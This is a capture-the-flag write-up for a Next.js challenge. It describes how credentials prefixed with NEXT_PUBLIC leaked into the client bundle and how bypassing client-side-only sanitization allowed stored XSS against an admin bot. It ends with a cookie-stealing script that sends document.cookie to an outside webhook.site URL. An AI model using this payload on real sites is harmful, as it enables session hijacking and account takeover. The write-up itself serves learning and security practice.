# CTF League - clientele

## Challenge
For this challenge we were provided with the souce files for a React/Nextjs application. Our first step was looking at the routes that it created, of which several admin routes and the login page are interesting. Looking at how it validates login credentials, there is a Map of Users in `lib/auth/users.ts`, which includes account objects that suggest passwords were stored in environment variables.
```ts
export const users: Map<User["username"], User> = new Map([
  [
    "bobs_construction",
    {
      username: "bobs_construction",
      // WARNING: Don't remove the `NEXT_PUBLIC` or login will break!
      password: process.env.NEXT_PUBLIC_USER_PASSWORD!,
      token: process.env.NEXT_PUBLIC_USER_TOKEN!,
    },
  ],
]);

export const admins: Map<User["username"], User> = new Map([
  [
    "admin",
    {
      username: "admin",
      password: process.env.NEXT_PUBLIC_ADMIN_PASSWORD!,
      token: process.env.NEXT_PUBLIC_ADMIN_TOKEN!,
    },
  ],
]);
```

Within Nextjs, any environment variables preprended with `NEXT_PUBLIC` as these passwords are can be used from the client, and are replaced with hardcoded values during the bundle phase and shipped to the client. With this knowledge we grepped the devtools source for the string `bobs_construction` and were able to find his password and auth token hardcoded in the object, and succesfully logged in. The admin account is not used imported from a react client component so we only have normal user access so far.

Further investigating the source for the webapp, we can see that whenever an admin account is authorized, it also sets the flag in a cookie. 
```ts
export async function authorizeAdmin(user: UserCreds): Promise<boolean> {
  if (
    !admins.has(user.username) ||
    admins.get(user.username)?.password !== user.password
  )
    return false;

  await setCookie("token", admins.get(user.username)!.token);
  await setCookie("role", "admin");
  await setCookie("flag", process.env.FLAG!);

  return true;
}
```
During this challenge, we were told that an admin account (via playwright automation) would routinely be using the site to accept/deny proposals submitted by users. With this in mind, we could potentially use the proposal method to perform cookie hijacking via cross site scripting. Using the GUI to write basic xss payloiads like <script>alert(1)</script>, we could see that the rendered DOM element was being sanitized, despite the use of `dangerouslySetInnerHTML()`. This appeared to be a dead end, except inspecting the devtools network tab, the sanization was happening in the browser, and the server performed no secondary validation. With this we could simply edit the body of a server action to the pure, unsanitized exploit. 

### Exploit
```js
<script>
fetch('https://webhook.site/[id]/{document.cookie}')
<script>
```